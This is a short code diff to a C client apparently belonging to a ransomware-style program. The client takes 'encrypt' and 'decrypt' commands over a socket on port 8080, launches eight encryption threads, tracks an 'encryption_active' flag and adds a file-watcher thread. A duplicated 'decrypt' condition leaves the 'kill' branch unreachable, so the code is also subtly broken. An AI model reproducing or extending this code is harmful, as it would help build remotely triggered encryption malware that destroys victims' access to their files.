@@ -10,8 +10,10 @@
 
 #include "../../headers/client.h"
 #include "../../headers/thread.h"
-#define PORT 8080
+#include "../../headers/watcher.h"
+#include "../../headers/globals.h"
 
+#define PORT 8080
 void *commands_listener(void *arg) {
     int client_fd = *(int *)arg;
     free(arg);
@@ -35,8 +37,10 @@ void *commands_listener(void *arg) {
             if (strcmp(arguments[0], "encrypt") == 0) {
                 printf("start_encryption\n");
                 initialize_threads(8, true);
+                encryption_active = true;
             } else if (strcmp(arguments[0], "decrypt") == 0) {
                 printf("start_decryption\n");
+                encryption_active = false;
                 initialize_threads(8, false);
             } else if (strcmp(arguments[0], "decrypt") == 0) {
                 printf("kill himself\n");
@@ -100,6 +104,9 @@ int startclient() {
     *clientfd = client_fd;
 
     pthread_t command_tid;
+    pthread_t watcher_tid;
     pthread_create(&command_tid, NULL, commands_listener, clientfd);
+    pthread_create(&watcher_tid, NULL, start_watcher, NULL);
+    pthread_join(watcher_tid, NULL);
     pthread_join(command_tid, NULL);
 }
